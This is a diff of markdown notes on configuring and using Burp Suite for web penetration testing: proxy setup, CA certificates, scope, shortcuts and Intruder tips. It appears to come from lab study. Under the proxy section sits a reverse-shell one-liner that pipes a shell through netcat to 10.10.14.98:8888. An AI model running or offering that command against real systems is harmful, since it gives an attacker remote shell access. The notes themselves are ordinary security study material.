@@ -23,6 +23,7 @@ Go to `Project settings -> no sandbox for builtin browser`
 
 
 ## FoxyProxy/Firefox proxy
+
 Firefox menu -> Settings -> Network Settings click Settings
 Select manual proxy configuration:
 	HTTP proxy: 127.0.0.1 8080
@@ -31,6 +32,7 @@ Select manual proxy configuration:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 8888 >/tmp/f
 
 ## Burp Suite CA
+
 To intercept and analyze HTTPS traffic, BS has Certificate Authority and uses it to issue on-th-fly certifactes for each website that we visit and pass through Burp.
 
 http://burp -> CA Certificate 
@@ -48,21 +50,28 @@ Need pass through for:
 ## Bypass intercepting HTTPS traffic by configurating to forward traffics towards websites without decrypting and re-encrypting them first.
 
 ## SOCKS Proxy in Burp
+
 `User options -> SOCKS Proxy -> 127.0.0.1 & port number` then tick the `Use Proxy`
 
 ## Too much data -> Add Scope to include/exclude
+
 `Target -> Scope -> Target scope`, to add manually or 
 right click and add under main `Target Site map` tab.
 
 ## How is the site structured -> Sitemap
+
 `Target -> Site map` Click the `>` and view in tree form.
 
 ## "Bad Request This combination of host and port requires TLS" -> Read Url
+
 Use https in url you fool!
 
 ## Software is preventing site X browser from connecting -> Setup certificates in browser
+
 Goto the very good visual guide on [THM](https://tryhackme.com/room/burpsuitebasics) - Task 10.
+
 ## Burp Intercepting Everything -> use the embedded Browser
+
 If you do not want manage proxys on host OS or inside a browser, just use the embedded browser. Goto
 `Project options -> Misc -> Embedded Browser` and check the  `Allow the embedded browser to run without a sandbox`.
 
@@ -73,6 +82,7 @@ SSL/TLS  -> SSL pass through feature
 ```
 
 ## Shortcuts
+
 For customisation go to `User Options > Misc > Edit Hotkeys`, for default shortcuts:
 
 **Navigation**
@@ -92,6 +102,7 @@ Shortcut | Function
 `Ctrl + D` | Delete an intercepted message
 
 ## Intruder Payloads
+
 - Recursive Grep = allows extract each paylaod from the response to the previous request - useful when you need to extract useful data or deliever an exploit 
 
 ## Need to Spoof your IP in burp?
@@ -110,7 +121,10 @@ Shortcut | Function
 	2. Leave Match field: `Location: AnnoyingPage.Lang`
 	3. In the Replace field: empty
 
+## Intruder Success
 
+- Location Response Header?
+- Unique Response Size
 
 ## References
 
